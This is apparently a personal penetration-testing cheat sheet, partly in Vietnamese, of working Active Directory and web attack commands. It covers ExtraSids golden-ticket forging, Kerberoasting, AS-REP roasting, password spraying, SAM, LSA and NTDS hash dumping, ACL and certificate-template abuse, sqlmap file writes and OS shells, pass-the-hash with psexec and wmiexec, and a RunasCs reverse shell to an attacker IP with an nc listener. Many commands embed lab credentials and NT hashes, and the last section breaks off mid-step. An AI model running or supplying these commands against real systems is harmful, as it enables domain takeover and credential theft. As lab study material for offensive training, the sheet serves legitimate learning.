# - [Enterprise Admin]: Always the ultimate target in a Forest Root domain.
```
##### Trust Relationships Child-Parent Trusts 
```
________________________________________________________________________________________
ExtraSids Attack (Child to Parent Escalation)
________________________________________________________________________________________
(Attack Prerequisites & Concepts) 

# 1. Concept: Exploits the lack of SID Filtering between parent-child domains in the same forest.
# 2. Key Attribute: sidHistory. We inject the Enterprise Admins SID into this attribute.
# 3. Goal: Create a Golden Ticket in the Child domain that grants Enterprise Admin rights in the Parent domain.
# 4. Requirements:
#    - KRBTGT NT Hash of the Child Domain.
#    - SID of the Child Domain.
#    - SID of the "Enterprise Admins" group (Parent Domain).
#    - A target username (can be fake).

========================================================================================
ExtraSids Attack from Windows
========================================================================================
____________________________________________
(Phase 1: Enumeration & Data Collection)
____________________________________________

# Step 1: Get Child Domain KRBTGT Hash (Must be Domain Admin in Child first).
# Using Mimikatz DCSync:
lsadump::dcsync /user:LOGISTICS\krbtgt /domain:LOGISTICS.INLANEFREIGHT.LOCAL

# Step 2: Get Child Domain SID.
Get-DomainSID

# Step 3: Get Parent "Enterprise Admins" Group SID.
# Note: Enterprise Admins always end in RID 519.
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid

____________________________________________
(Phase 2: Forge & Inject Ticket - Using Mimikatz or Rubeus)
____________________________________________

(Using Mimikatz)
# Create and Inject Golden Ticket with ExtraSids (-519).
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /krbtgt:<Child_KRBTGT_Hash> /sids:<Parent_EA_SID> /ptt

or

(Using Rubeus)
# Same attack using Rubeus (Cleaner and more modern).
.\Rubeus.exe golden /rc4:<Child_KRBTGT_Hash> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /sids:<Parent_EA_SID> /user:hacker /ptt

____________________________________________
(Phase 3: Verification & Takeover)
____________________________________________

# Check if the ticket is in memory.
klist

# Access Parent Domain Controller C$ share (Confirms Full Admin).
ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\C$

# Perform DCSync against Parent Domain to dump Domain Admin hashes.
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

========================================================================================
ExtraSids Attack from Linux   (Using Impacket)
========================================================================================

____________________________________________
(Phase 1: Data Collection)
____________________________________________

# 1. Perform DCSync to dump the Child Domain KRBTGT NT Hash.
# Requires Domain Admin privileges in the Child Domain.
secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.240 -just-dc-user krbtgt

# 2. Enumerate Child Domain SID using SID Brute Forcing.
lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.240 | grep "Domain SID"

# 3. Enumerate Parent Domain SID and Enterprise Admins RID (519).
# Targeting the Parent Domain Controller directly.
lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.5 | grep -B 12 "Enterprise Admins"

____________________________________________
(Phase 2: Forge & Inject Ticket)
____________________________________________

# 1. Forge a Golden Ticket and inject the Parent Enterprise Admin SID into [ExtraSids].
# This creates a local credential cache file (hacker.ccache).
ticketer.py -nthash <Child_Hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <Child_SID> -extra-sid <Parent_EA_SID> hacker

# 2. Set the Kerberos Environment Variable to use the forged ticket.
export KRB5CCNAME=hacker.ccache

____________________________________________
(Phase 3: Final Takeover)
____________________________________________

# 1. Execute a SYSTEM shell on the Parent Domain Controller.
# Use [-k] for Kerberos Auth and [-no-pass] since we are using the ccache ticket.
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -k -no-pass

____________________________________________
(Automate attack with raiseChild.py) (https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
____________________________________________

# NOTE: Automate the entire escalation process with a single command.
# It performs SID lookup, KRBTGT dumping, ticket forging, and execution automatically.
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

##### Trust Relationships Cross-Forest Trust
```
========================================================================================
Cross-Forest Trust Abuse (Windows Path)
========================================================================================

# 1. Enumerate Kerberoastable Users in Partner Forest
Get-DomainUser -SPN -Domain <Partner_Domain> | select SamAccountName, memberof

# 2. Perform Cross-Forest Kerberoasting (Offline Crack with Hashcat mode 13100)
.\Rubeus.exe kerberoast /domain:<Partner_Domain> /user:<Target_User> /nowrap

# 3. Find "Spies" (Foreign Members in Partner Groups)
# This identifies users from your domain who have rights in the partner domain.
Get-DomainForeignGroupMember -Domain <Partner_Domain>

# 4. Access Partner DC (If you have credentials or local admin rights)
Enter-PSSession -ComputerName <Partner_DC_FQDN> -Credential <Domain>\<User>

# 5. Check for SID History Migration (If SID Filtering is OFF)
# Look for users with sIDHistory attributes pointing to highly privileged RIDs (-519, -512)
Get-DomainUser -Domain <Partner_Domain> -Properties sidhistory

========================================================================================
Cross-Forest Trust Abuse (Linux Attack Path)
========================================================================================

# 1. DNS Setup (CRITICAL)
# Edit /etc/resolv.conf to point to the Target Domain Controller
domain <TARGET_DOMAIN>
nameserver <TARGET_DC_IP>

example :
____________________________________________
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
____________________________________________
or
____________________________________________
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
____________________________________________

# 2. Cross-Forest Kerberoasting
# List SPNs in the partner forest
GetUserSPNs.py -target-domain <PARTNER_DOMAIN> <CURRENT_DOMAIN>/<USER>
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Request TGS hash for offline cracking
GetUserSPNs.py -request -target-domain <PARTNER_DOMAIN> <CURRENT_DOMAIN>/<USER>
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# 3. BloodHound Enumeration (Python Version)
# Run against current domain ( NEED DNS SETUP )
bloodhound-python -d <DOMAIN_A> -dc <DC_A> -c All -u <USER> -p <PASS>
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u wley -p Klmcargo2
# Run against partner domain ( NEED NEW DNS SETUP ) 
bloodhound-python -d <DOMAIN_B> -dc <DC_B> -c All -u <USER> -p <PASS>
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u wley@inlanefreight.local -p Klmcargo2

# 4. Accessing the Target (Pass-the-Password)
# Use the cracked password to log in via WinRM (evil-winrm) or PSExec
evil-winrm -i <TARGET_DC_IP> -u <USER> -p <CRACKED_PASSWORD>

____________________________________________________________________________________
The Logic Behind Cross-Forest Enumeration
____________________________________________________________________________________

# 1. Identity Context: The tool uses the domain suffix in the username (e.g., @inlanefreight.local) to identify where the authentication should start.

# 2. DNS Referrals: The target Domain Controller (specified by -dc) acts as a pointer. Because a Trust exists, DC-B knows how to find DC-A via its own DNS Forwarders.

# 3. Connection Flow:
#    Attacker -> Target DC (Asks about User)
#    Target DC -> Attacker (Provides Referral to Home DC)
#    Attacker -> Home DC (Authenticates & Gets TGT)
#    Attacker -> Target DC (Uses TGT to get TGS & Collects Data)

# 4. Critical Pre-requisite: 
#    Your attack host must be able to reach the IP of the Home DC once the Target DC provides the referral. Ping check to both DCs is mandatory.
```
##### AD Auditing Toolkit
```
____________________________________________________________________________________
AD Auditing Toolkit - Proof of Concept & Evidence
____________________________________________________________________________________

# 1. AD Explorer (Sysinternals) (https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer)
# Goal: Navigate AD DB and create offline backups.
- Action: File -> Create Snapshot.
- Use Case: Offline analysis of user attributes and permissions.

# 2. PingCastle (Health Check & Risk Scoring) (https://www.pingcastle.com/documentation/)
# Goal: Comprehensive risk assessment report.
- Interactive Mode: PingCastle.exe
- Key Option: 1-healthcheck (Scoring the risk of a domain).
- Pro Tip: Check "Scanner Options" for specific flaws like ZeroLogon or Spooler.

# 3. Group3r (GPO Vulnerability Finder) (https://github.com/Group3r/Group3r)
# Goal: Find credentials/misconfigurations in Group Policies.
- Syntax: group3r.exe -f report.log -s
- Focus: Look for findings indented at the 3rd level.

# 4. ADRecon (Full Domain Inventory)  (https://github.com/adrecon/ADRecon)
# Goal: Gather massive data into Excel/HTML.
- Syntax: .\ADRecon.ps1
- Requirements: Needs Excel installed for auto-report generation.
- Output: HTML report and CSV folder with all objects.

# 5. Reporting Strategy
- Use Evidence from these tools to acquire backing/funding for security fixes.
- Visualize attack paths to make reporting more convincing.
```
## Login Brute Forcing

##### Hydra
```
# Basic Auth Brute Force - User/Pass Wordlists
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /

# Login Form Brute Force - Static User, Pass Wordlist
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

## SQLMap
```
# Run SQLMap without asking for user input
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# SQLMap with POST request specifying an unjection point with asterisk
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

# Passing an HTTP request file to SQLMap
sqlmap -r req.txt

# Specifying a PUT request
sqlmap -u www.target.com --data='id=1' --method PUT

# Specifying a prefix or suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

# Table row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

# Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

# CSRF token bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

# List all tamper scripts
sqlmap --list-tampers

# Enumerate the privileges that the database user has
sqlmap -u "http://www.example.com/?id=1" --privileges

# Read a file  ( need privileges  such as FILE) 
sqlmap -u "http://www.example.com/?id=1" --file-read=/etc/nginx/sitesenabled/default

# Writing a file
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Spawn a shell
sqlmap -u "http://www.example.com/?id=1" --os-shell

```
## Bash-Line-Editing-Shortcut

```
Alt + D             : Xóa từ vị trí con trỏ đến hết từ hiện tại
Alt + F             : Nhảy con trỏ lên phía trước một từ.
Alt + B             : Nhảy con trỏ lùi lại phía sau một từ.
Alt + Backspace	    : Xóa một từ ngược về phía trước (tương tự Ctrl + W nhưng phân biệt ký tự đặc biệt tốt hơn).
Ctrl + W	        : Xóa từ ngay phía trước con trỏ (hữu ích nếu bạn đang ở cuối mật khẩu).
Ctrl + K	        : Xóa toàn bộ phần còn lại của dòng tính từ vị trí con trỏ về bên phải.
Ctrl + U	        : Xóa sạch toàn bộ dòng lệnh (nếu bạn muốn viết lại từ đầu).


```
## bloodhound 

```
# command download rusthound-ce
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env
cargo --version
sudo apt update
sudo apt install libkrb5-dev clang -y
cargo install rusthound-ce

or

sudo apt update
sudo apt install cargo
cargo install rusthound-ce

or

wget https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.5/rusthound-ce-Linux-gnu-x86_64.tar.gz

or

https://github.com/dirkjanm/BloodHound.py

# run bloodhound to colect data   ( command download : pip3 install bloodhound ) 
bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.10.11.69 --zip

#  another run bloodhound ( recomment becase can colllect all certtemplate ) ( command download :   cargo install rusthound-ce  or wget https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.5/rusthound-ce-Linux-gnu-x86_64.tar.gz )
rusthound-ce -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -z 

# run neo4j
sudo neo4j console

# run bloodhound
bloodhound

____________________________________________
(Recon Tool Decision Tree)
____________________________________________

# CASE 1: Single Domain / Simple Lab
# Use bloodhound-python with -ns flag for quick & easy collection.
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <DC_IP> -c all --zip

# CASE 2: Multi-Domain / Forest Trusts
# MANDATORY: Edit /etc/resolv.conf to point to Forest Root DC.
# Then run without -ns to allow system-wide resolution and referrals.
bloodhound-python -d <DOMAIN> -dc <DC_FQDN> -c All -u <USER> -p <PASS>

# CASE 3: Hunting for ADCS Vulnerabilities (ESC1-ESC13)
# Use RustHound-CE to capture certificate template misconfigurations.
rusthound -d <DOMAIN> -u <USER> -p <PASS> --adcs --zip
```
## netexec

```
# auth with smb 
netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'

# auth with smb by kerberoas when NTLM dissable
netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k

# auth with winrm  
netexec winrm  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' 

# auth with ldap  
netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'

# auth with ftp  
netexec ftp  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'

# auth with ldap by kerberoas when NTLM dissable
netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k

# auth with mssql by kerberoas when NTLM dissable
netexec mssql dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --local-auth

# generate and auth by file krb5.conf
netexec smb 10.10.11.76 --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf

# list users 
netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --users

# Enumerating Logged-on users.
netexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# list groups 
netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --groups

# Get Password Policy info
netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --pass-pol

# Get description info 
netexec ldap dc01.fluffy.htb -u '' -p '' --query "(description=*)" description

# list shares 
netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares

# using module (-M) spider_plus to go through each readable share (Dev-share) and list all readable files. The results are outputted in JSON
netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M spider_plus --share Dev-share

# Using  gpp_autologin Module retrieve Cleartext password in  file Registry.xml
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin 

# Using  gpp_password Module  Retrieving GPP Passwords in file xml contain  cpassword
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password

# AS-REP Roasting ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack ) 
netexec ldap dc01.fluffy.htb -u '' -p '' --asreproast output.txt

# get number computer can create
netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  -M maq

# command add new computer
netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  -M add-computer -o NAME='HACKER-PC' PASSWORD='Password123!'

# list all in folder share IT  
netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares --spider IT --regex .

# get file in folder share IT  
netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --share IT --get-file 'First-Line Support\\a.xlsx' a.xlsx

# run bloodhound  by netexec 
netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --bloodhound --dns-server 10.10.11.42 --collection all

# try auth with user and pass in 2 file ( no  bruteforce ) 
netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --no-bruteforce --continue-on-success

# try auth with user and pass in 2 file  
netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --continue-on-success

# Password Spraying
netexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

# p.agila can read the LAPS password from the ms-MCS-AdmPwd property  ( p.agila need have   ReadLAPSPassword permission) 
netexec smb dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --laps --ntds

# Kerberoasting ( Kerberoasting with auth kerberoas when NTLM dissable) 
netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --kerberoasting -  
or 
netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k --kerberoasting svc_winrm.hash 

# run ADCS modules  
netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M adcs

# p.agila have ReadGMSAPassword permission can reed password of machine account 
netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --gmsa

# command to list deleted user and object and restore it ( p.agila need restore user permission ) 
netexec.py ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k -M tombstone -o ACTION=query
netexec.py ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k -M tombstone -o ACTION=restore ID=1c6b1deb-c372-4cbb-87b1-15031de169db SCHEME=ldap

# Uses netexec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. ( need priv LOCAL ADMIN to dump SAM ) 
netexec smb <ip> --local-auth -u <username> -p <password> --sam

# Uses netexec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. ( need priv LOCAL ADMIN to dump LSA secrets ) 
netexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Uses netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.( need priv DOMAIN ADMIN to dump NTDS.dit) 
netexec smb <ip> -u <username> -p <password> --ntds

# Execute a command over the SMB service using netexec.
netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

```
## certipy

```
# get info of account ca_svc
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read

# get a list of all the templates    ( hash or clear text)
certipy find -u j.fleischman@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8   -stdout

# find templates vuln 
certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
or
certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -text -stdout -vulnerable

# Shadow Credential  (  p.agila need have GenericWrite over winrm_svc , can targeted Kerberoast (give the user a SPN, get a hash, and try to break it to get their password))
certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
or
certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc -dc-ip 10.129.6.201 -scheme ldap

# ECS1 ( HACKER-PC$ have can enroll with  template CorpVPN vuln ) 
certipy req -u 'HACKER-PC$' -p 'Password123!' -ca 'AUTHORITY-CA' -target 'authority.authority.htb' -template 'CorpVPN' -upn 'administrator@authority.htb' -dc-ip 10.129.6.20
or
certipy req -u 'HACKER-PC$' -p 'Password123!'  -ca AUTHORITY-CA -dc-ip 10.129.6.20 -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug

```
## autobloodyAD

```
# download file autobloodyAD.py   (  https://github.com/lineeralgebra/autobloodyAD )
wget https://raw.githubusercontent.com/lineeralgebra/autobloodyAD/refs/heads/main/autobloodyAD.py 

# run autobloodyAD.py 
python3 autobloodyAD.py 


```
## bloodyAD

```
# adding the p.agila user to the Service Accounts group
bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila

# adding dcsync permission to account p.agila ( can dump all hash in DC)  (p.agila need have permission  WriteDACL to fluffy.htb ) 
bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add dcsync 'p.agila' 

# adding a SPN to alfred to get kerberoas to have a hash  alfred  ( henry need have  WriteSPN to alfred )   ( or auth by kerberoas when NTLM dissable) 
bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host dc01.tombwatcher.htb set object alfred servicePrincipalName -v 'http/whatever'
or
bloodyAD -d tombwatcher.htb -k --host dc01.tombwatcher.htb -p 'H3nry_987TGV!' set object svc_winrm servicePrincipalName -v 'http/whatever' 

# alfred have ReadGMSAPassword permission can reed password of machine account 'ANSIBLE_DEV$'
bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword

# change password sam  ( ANSIBLE_DEV$ need have ForceChangePassword permission ) 
bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':1c37d00093dc2a5f25176bf2d474afdc' --host dc01.tombwatcher.htb set password "sam" "0xdf0xdf!"

# setting the owner of John to Sam  ( Sam need have WriteOwner permission )
bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb set owner john sam

# give Sam GenericAll over John  ( Sam need have owner permission to John )
bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb add genericAll john sam

# sam can read the LAPS password from the ms-MCS-AdmPwd property  ( sam need have   ReadLAPSPassword permission) 
bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb get object 'DC$' --attr ms-mcs-AdmPwd

```
## impacket 

```
# auth with kerberoas in AD   ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb)
impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.10.11.76       (Saving ticket in svc_winrm.ccache)
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb

# connect shares and  auth with kerberoas in AD  ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb)
impacket-smbclient -k todd.wolfe@dc.voleur.htb

# dump Data Protection API (DPAPI) to get credentials ( need have 2 file) 
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password  <pass-of-user-todd.wolfe>                                      (key have find here)
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key <key-have-find>

with path of 2 file : 
c:\users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3
c:\users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88

# command to dump use 3 file 
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL

# add new computer HACKER-PC
impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name HACKER-PC -computer-pass 0xdf0xdf0xdf -dc-ip 10.10.11.222

# impersonate Administrator to get file Administrator.ccache ( EVIL01$ can  impersonate users on AUTHORITY$ )
impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/EVIL01$:Str0ng3st_P@ssw0rd!'

# import file Administrator.ccache  to dump ntlm 
KRB5CCNAME=Administrator.ccache impacket-secretsdump  -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm

# AS-REP Roasting with account svc-alfresco ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack )  
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.95.210 -no-pass

# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
or ( get all ) 
impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request

```
## Metasploit

```
# run searchsploit
searchsploit openssh 7.2

# SID  domain enumeration by mssql  ( need credentials) 
use auxiliary/admin/mssql/mssql_enum_domain_accounts

# MSSQL Ping in Metasploit
use scanner/mssql/mssql_ping

# Metasploit command that runs a ping sweep module against the specified network segment (RHOSTS=172.16.5.0/23).
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# Metasploit command that selects the socks_proxy auxiliary module.
use auxiliary/server/socks_proxy

# Metasploit command used to select the autoroute module.
use post/multi/manage/autoroute
```
## smbclient

```
# command smbclient to connect folder shares by auth kerberoas
smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT

# command smbclient to list and  connect folder shares by anonymous
smbclient -L //10.129.6.20 -N
smbclient //10.129.6.20/Development -N

# command smbclient to download all to local machine 
prompt off
recurse true
mget *

```
## gobuster 

```
# Run a directory scan on a website
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt

# Run a sub-domain scan on a website
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

# Run a vhost scan on a website
gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain


```
## whatweb  

```
# List details about the webserver/certificates
whatweb 10.10.10.121

```
## useful-command 

```
# run nmap speed
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.158 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.158

# command to download bloodyAD
pip3 install bloodyad
pip3 install --upgrade minikerberos

# command synch time ad
sudo ntpdate dc.voleur.htb

# command to generate hosts file 
netexec smb 10.10.11.76 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
( The file must have the following structure   :    10.10.11.76     DC.voleur.htb  voleur.htb  DC  ) 

# auth with kerberoas in AD by netexec ( flag -k )  ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb) 
sudo ntpdate dc.voleur.htb
netexec smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -k --generate-krb5-file voleur.krb5
sudo cp voleur.krb5  /etc/krb5.conf
kinit svc_winrm
evil-winrm -i dc.voleur.htb -r voleur.htb

# auth with kerberoas in AD by impacket-getTGT  ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb)
impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.10.11.76       (Saving ticket in svc_winrm.ccache)
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb


below is file /etc/krb5.conf : 

______________________________________
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VOLEUR.HTB

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
        default_domain = voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
______________________________________

# command AD Recyclebin in powershell
Get-ADOptionalFeature 'Recycle Bin Feature'
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db


# command run RunasCs.exe to connect reverse shell ( can use to run shell in another user when have credentials but not have ssh or winrm) 
 .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.6:443  
rlwrap -cAr nc -lnvp 443

# command  use secretsdump.py to dump 
secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit

# command  get shell by wmiexec.py
wmiexec.py voleur.htb/administrator@dc.voleur.htb -no-pass -hashes :e656e07c56d831611b577b160b259ad2 -k
or
wmiexec.py active.htb/Administrator:'Ticketmaster1968'@10.129.181.215

# command  get shell by psexec.py
psexec.py -hashes :e656e07c56d831611b577b160b259ad2 -k "voleur.htb/administrator@dc.voleur.htb"
or
psexec.py active.htb/Administrator:'Ticketmaster1968'@10.129.181.215

# command  Kerberoasting ( auth with kerberoas when NTLM dissable )  by targetedKerberoast.py
impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.7             ( Saving ticket in svc_ldap.ccache) 
export KRB5CCNAME=svc_ldap.ccache
python3 targetedKerberoast.py -d voleur.htb --dchost DC -u svc_ldap@voleur.htb -k

# command scp download all file in folder shares to local
scp  svc_backup@dc.voleur.htb:/mnt/c/IT/* .

# command scp upload all file in folder local to folder shares
scp * svc_backup@dc.voleur.htb:/mnt/c/IT/

# command smbclient to connect folder shares by auth kerberoas
smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT

# run bloodhound  by netexec 
netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --bloodhound --dns-server 10.10.11.42 --collection all
Step-to-escal

# test RCE
sudo tcpdump -i tun0 icmp and not host 10.10.14.1

# Listenning correct in port 443 anh ip tun0 ( 10.10.14.4 ) 
sudo nc -lvnp 443 -s 10.10.14.4

# RDP with share drive 
xfreerdp /u:svc_sql /p:lucky7 /v:10.129.253.79:8888 /dynamic-resolution /drive:Shared,//home/htb-ac-1224655/

```
## Step-to-escal
```
## 1. Constrained Delegation ( HELEN.FROST  need have GenericAll permission to machine FS01 and have SeEnableDelegationPrivilege in whoami /priv )

# Enable the Protocol Transition feature and modify UAC (userAccountControl) of machine  FS01$ to enable flag  TRUSTED_TO_AUTH_FOR_DELEGATION
bloodyAD -d redelegate.vl -u HELEN.FROST -p '0xdf0xdf!' --host 10.129.234.50 add  uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

# write SPN (Service Principal Name) of service  cifs in DC to  msDS-AllowedToDelegateTo object in machine  FS01$ 
